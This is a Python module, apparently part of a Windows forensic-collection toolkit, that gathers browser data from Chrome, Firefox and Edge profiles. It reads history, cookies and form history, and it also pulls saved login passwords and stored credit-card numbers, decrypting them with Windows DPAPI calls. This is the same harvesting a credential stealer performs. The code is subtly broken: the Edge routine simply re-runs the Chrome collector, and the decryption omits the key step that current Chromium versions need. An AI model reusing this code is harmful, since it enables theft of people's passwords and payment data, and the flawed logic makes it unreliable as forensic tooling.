from typing import Dict, List, Any, Optional
from datetime import datetime
import sqlite3
import json
import shutil
import os
from pathlib import Path
import win32crypt
import base64
import win32api
import win32security
import win32con
import win32process
import win32ts
import win32net
import win32netcon
import win32profile
import win32cred
import win32security
import win32file
import win32timezone
import win32evtlog
import win32evtlogutil
import win32gui
import win32ui
import win32print
import win32com.client
import pythoncom
import psutil
import yara
import hashlib
from .base import WindowsCollector

class BrowserHistoryCollector(WindowsCollector):
    """Collecteur pour l'historique des navigateurs"""
    
    def __init__(self):
        super().__init__()
        self.requires_admin = False
        
        # Chemins des profils des navigateurs
        self.browser_paths = {
            'chrome': {
                'base': Path.home() / 'AppData/Local/Google/Chrome/User Data',
                'history': 'History',
                'cookies': 'Cookies',
                'login_data': 'Login Data',
                'web_data': 'Web Data'
            },
            'firefox': {
                'base': Path.home() / 'AppData/Roaming/Mozilla/Firefox/Profiles',
                'history': 'places.sqlite',
                'cookies': 'cookies.sqlite',
                'form_history': 'formhistory.sqlite',
                'downloads': 'downloads.sqlite'
            },
            'edge': {
                'base': Path.home() / 'AppData/Local/Microsoft/Edge/User Data',
                'history': 'History',
                'cookies': 'Cookies',
                'login_data': 'Login Data',
                'web_data': 'Web Data'
            }
        }
    
    def collect(self) -> Dict[str, Any]:
        """Collecte l'historique des navigateurs"""
        browser_data = {}
        
        # Chrome
        try:
            browser_data['chrome'] = self._collect_chrome_data()
        except Exception as e:
            self.logger.error(f"Erreur lors de la collecte des données Chrome: {e}")
            browser_data['chrome'] = {'error': str(e)}
        
        # Firefox
        try:
            browser_data['firefox'] = self._collect_firefox_data()
        except Exception as e:
            self.logger.error(f"Erreur lors de la collecte des données Firefox: {e}")
            browser_data['firefox'] = {'error': str(e)}
        
        # Edge
        try:
            browser_data['edge'] = self._collect_edge_data()
        except Exception as e:
            self.logger.error(f"Erreur lors de la collecte des données Edge: {e}")
            browser_data['edge'] = {'error': str(e)}
        
        return browser_data
    
    def _collect_chrome_data(self) -> Dict[str, Any]:
        """Collecte les données de Chrome"""
        chrome_data = {}
        base_path = self.browser_paths['chrome']['base']
        
        if not base_path.exists():
            return {'error': 'Profil Chrome non trouvé'}
        
        # Parcours des profils
        for profile_dir in base_path.glob('*'):
            if not profile_dir.is_dir() or profile_dir.name == 'System Profile':
                continue
            
            profile_name = profile_dir.name
            chrome_data[profile_name] = {}
            
            # Historique
            try:
                chrome_data[profile_name]['history'] = self._get_chrome_history(profile_dir)
            except Exception as e:
                chrome_data[profile_name]['history'] = {'error': str(e)}
            
            # Cookies
            try:
                chrome_data[profile_name]['cookies'] = self._get_chrome_cookies(profile_dir)
            except Exception as e:
                chrome_data[profile_name]['cookies'] = {'error': str(e)}
            
            # Données de connexion
            try:
                chrome_data[profile_name]['logins'] = self._get_chrome_logins(profile_dir)
            except Exception as e:
                chrome_data[profile_name]['logins'] = {'error': str(e)}
            
            # Données web
            try:
                chrome_data[profile_name]['web_data'] = self._get_chrome_web_data(profile_dir)
            except Exception as e:
                chrome_data[profile_name]['web_data'] = {'error': str(e)}
        
        return chrome_data
    
    def _get_chrome_history(self, profile_dir: Path) -> List[Dict[str, Any]]:
        """Récupère l'historique de Chrome"""
        history_path = profile_dir / self.browser_paths['chrome']['history']
        if not history_path.exists():
            return []
        
        # Copie temporaire car la base est verrouillée
        temp_path = history_path.parent / 'temp_history'
        shutil.copy2(history_path, temp_path)
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, last_visit_time, visit_count
                FROM urls
                ORDER BY last_visit_time DESC
            """)
            
            history = []
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1],
                    'last_visit': datetime.fromtimestamp(row[2] / 1000000 - 11644473600),
                    'visit_count': row[3]
                })
            
            return history
            
        finally:
            conn.close()
            temp_path.unlink()
    
    def _get_chrome_cookies(self, profile_dir: Path) -> List[Dict[str, Any]]:
        """Récupère les cookies de Chrome"""
        cookies_path = profile_dir / self.browser_paths['chrome']['cookies']
        if not cookies_path.exists():
            return []
        
        # Copie temporaire
        temp_path = cookies_path.parent / 'temp_cookies'
        shutil.copy2(cookies_path, temp_path)
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, value, encrypted_value, path,
                       expires_utc, is_secure, is_httponly
                FROM cookies
            """)
            
            cookies = []
            for row in cursor.fetchall():
                try:
                    encrypted_value = row[3]
                    if encrypted_value:
                        value = self._decrypt_chrome_value(encrypted_value)
                    else:
                        value = row[2]
                    
                    cookies.append({
                        'host': row[0],
                        'name': row[1],
                        'value': value,
                        'path': row[4],
                        'expires': datetime.fromtimestamp(row[5] / 1000000 - 11644473600),
                        'secure': bool(row[6]),
                        'httponly': bool(row[7])
                    })
                except:
                    continue
            
            return cookies
            
        finally:
            conn.close()
            temp_path.unlink()
    
    def _get_chrome_logins(self, profile_dir: Path) -> List[Dict[str, Any]]:
        """Récupère les données de connexion de Chrome"""
        login_path = profile_dir / self.browser_paths['chrome']['login_data']
        if not login_path.exists():
            return []
        
        # Copie temporaire
        temp_path = login_path.parent / 'temp_logins'
        shutil.copy2(login_path, temp_path)
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT origin_url, username_value, password_value,
                       date_created, date_last_used
                FROM logins
            """)
            
            logins = []
            for row in cursor.fetchall():
                try:
                    encrypted_password = row[2]
                    if encrypted_password:
                        password = self._decrypt_chrome_value(encrypted_password)
                    else:
                        password = None
                    
                    logins.append({
                        'url': row[0],
                        'username': row[1],
                        'password': password,
                        'created': datetime.fromtimestamp(row[3] / 1000000 - 11644473600),
                        'last_used': datetime.fromtimestamp(row[4] / 1000000 - 11644473600)
                    })
                except:
                    continue
            
            return logins
            
        finally:
            conn.close()
            temp_path.unlink()
    
    def _get_chrome_web_data(self, profile_dir: Path) -> Dict[str, Any]:
        """Récupère les données web de Chrome"""
        web_data_path = profile_dir / self.browser_paths['chrome']['web_data']
        if not web_data_path.exists():
            return {}
        
        # Copie temporaire
        temp_path = web_data_path.parent / 'temp_web_data'
        shutil.copy2(web_data_path, temp_path)
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            web_data = {
                'autofill': self._get_chrome_autofill(cursor),
                'keywords': self._get_chrome_keywords(cursor),
                'payment_methods': self._get_chrome_payment_methods(cursor)
            }
            
            return web_data
            
        finally:
            conn.close()
            temp_path.unlink()
    
    def _get_chrome_autofill(self, cursor: sqlite3.Cursor) -> List[Dict[str, Any]]:
        """Récupère les données d'auto-remplissage de Chrome"""
        cursor.execute("""
            SELECT name, value, count, date_created, date_last_used
            FROM autofill
        """)
        
        autofill = []
        for row in cursor.fetchall():
            autofill.append({
                'name': row[0],
                'value': row[1],
                'count': row[2],
                'created': datetime.fromtimestamp(row[3] / 1000000 - 11644473600),
                'last_used': datetime.fromtimestamp(row[4] / 1000000 - 11644473600)
            })
        
        return autofill
    
    def _get_chrome_keywords(self, cursor: sqlite3.Cursor) -> List[Dict[str, Any]]:
        """Récupère les mots-clés de recherche de Chrome"""
        cursor.execute("""
            SELECT keyword, url, date_created
            FROM keywords
        """)
        
        keywords = []
        for row in cursor.fetchall():
            keywords.append({
                'keyword': row[0],
                'url': row[1],
                'created': datetime.fromtimestamp(row[2] / 1000000 - 11644473600)
            })
        
        return keywords
    
    def _get_chrome_payment_methods(self, cursor: sqlite3.Cursor) -> List[Dict[str, Any]]:
        """Récupère les méthodes de paiement de Chrome"""
        cursor.execute("""
            SELECT name_on_card, expiration_month, expiration_year,
                   card_number_encrypted, date_modified
            FROM credit_cards
        """)
        
        payment_methods = []
        for row in cursor.fetchall():
            try:
                encrypted_number = row[3]
                if encrypted_number:
                    card_number = self._decrypt_chrome_value(encrypted_number)
                else:
                    card_number = None
                
                payment_methods.append({
                    'name': row[0],
                    'expiration_month': row[1],
                    'expiration_year': row[2],
                    'card_number': card_number,
                    'modified': datetime.fromtimestamp(row[4] / 1000000 - 11644473600)
                })
            except:
                continue
        
        return payment_methods
    
    def _decrypt_chrome_value(self, encrypted_value: bytes) -> str:
        """Déchiffre une valeur chiffrée de Chrome"""
        try:
            # Récupération de la clé de chiffrement
            key = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
            return key.decode('utf-8')
        except:
            return None
    
    def _collect_firefox_data(self) -> Dict[str, Any]:
        """Collecte les données de Firefox"""
        firefox_data = {}
        base_path = self.browser_paths['firefox']['base']
        
        if not base_path.exists():
            return {'error': 'Profil Firefox non trouvé'}
        
        # Parcours des profils
        for profile_dir in base_path.glob('*'):
            if not profile_dir.is_dir():
                continue
            
            profile_name = profile_dir.name
            firefox_data[profile_name] = {}
            
            # Historique
            try:
                firefox_data[profile_name]['history'] = self._get_firefox_history(profile_dir)
            except Exception as e:
                firefox_data[profile_name]['history'] = {'error': str(e)}
            
            # Cookies
            try:
                firefox_data[profile_name]['cookies'] = self._get_firefox_cookies(profile_dir)
            except Exception as e:
                firefox_data[profile_name]['cookies'] = {'error': str(e)}
            
            # Historique des formulaires
            try:
                firefox_data[profile_name]['form_history'] = self._get_firefox_form_history(profile_dir)
            except Exception as e:
                firefox_data[profile_name]['form_history'] = {'error': str(e)}
            
            # Téléchargements
            try:
                firefox_data[profile_name]['downloads'] = self._get_firefox_downloads(profile_dir)
            except Exception as e:
                firefox_data[profile_name]['downloads'] = {'error': str(e)}
        
        return firefox_data
    
    def _get_firefox_history(self, profile_dir: Path) -> List[Dict[str, Any]]:
        """Récupère l'historique de Firefox"""
        history_path = profile_dir / self.browser_paths['firefox']['history']
        if not history_path.exists():
            return []
        
        # Copie temporaire
        temp_path = history_path.parent / 'temp_history'
        shutil.copy2(history_path, temp_path)
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, last_visit_date, visit_count
                FROM moz_places
                ORDER BY last_visit_date DESC
            """)
            
            history = []
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1],
                    'last_visit': datetime.fromtimestamp(row[2] / 1000000),
                    'visit_count': row[3]
                })
            
            return history
            
        finally:
            conn.close()
            temp_path.unlink()
    
    def _get_firefox_cookies(self, profile_dir: Path) -> List[Dict[str, Any]]:
        """Récupère les cookies de Firefox"""
        cookies_path = profile_dir / self.browser_paths['firefox']['cookies']
        if not cookies_path.exists():
            return []
        
        # Copie temporaire
        temp_path = cookies_path.parent / 'temp_cookies'
        shutil.copy2(cookies_path, temp_path)
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host, name, value, path, expiry, isSecure, isHttpOnly
                FROM moz_cookies
            """)
            
            cookies = []
            for row in cursor.fetchall():
                cookies.append({
                    'host': row[0],
                    'name': row[1],
                    'value': row[2],
                    'path': row[3],
                    'expires': datetime.fromtimestamp(row[4]),
                    'secure': bool(row[5]),
                    'httponly': bool(row[6])
                })
            
            return cookies
            
        finally:
            conn.close()
            temp_path.unlink()
    
    def _get_firefox_form_history(self, profile_dir: Path) -> List[Dict[str, Any]]:
        """Récupère l'historique des formulaires de Firefox"""
        form_history_path = profile_dir / self.browser_paths['firefox']['form_history']
        if not form_history_path.exists():
            return []
        
        # Copie temporaire
        temp_path = form_history_path.parent / 'temp_form_history'
        shutil.copy2(form_history_path, temp_path)
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT fieldname, value, timesUsed, firstUsed, lastUsed
                FROM moz_formhistory
            """)
            
            form_history = []
            for row in cursor.fetchall():
                form_history.append({
                    'field': row[0],
                    'value': row[1],
                    'times_used': row[2],
                    'first_used': datetime.fromtimestamp(row[3] / 1000000),
                    'last_used': datetime.fromtimestamp(row[4] / 1000000)
                })
            
            return form_history
            
        finally:
            conn.close()
            temp_path.unlink()
    
    def _get_firefox_downloads(self, profile_dir: Path) -> List[Dict[str, Any]]:
        """Récupère l'historique des téléchargements de Firefox"""
        downloads_path = profile_dir / self.browser_paths['firefox']['downloads']
        if not downloads_path.exists():
            return []
        
        # Copie temporaire
        temp_path = downloads_path.parent / 'temp_downloads'
        shutil.copy2(downloads_path, temp_path)
        
        try:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT place_id, content, url, dateAdded, lastModified
                FROM moz_downloads
            """)
            
            downloads = []
            for row in cursor.fetchall():
                downloads.append({
                    'content': row[1],
                    'url': row[2],
                    'added': datetime.fromtimestamp(row[3] / 1000000),
                    'modified': datetime.fromtimestamp(row[4] / 1000000)
                })
            
            return downloads
            
        finally:
            conn.close()
            temp_path.unlink()
    
    def _collect_edge_data(self) -> Dict[str, Any]:
        """Collecte les données d'Edge"""
        # Edge utilise le même format que Chrome
        return self._collect_chrome_data() 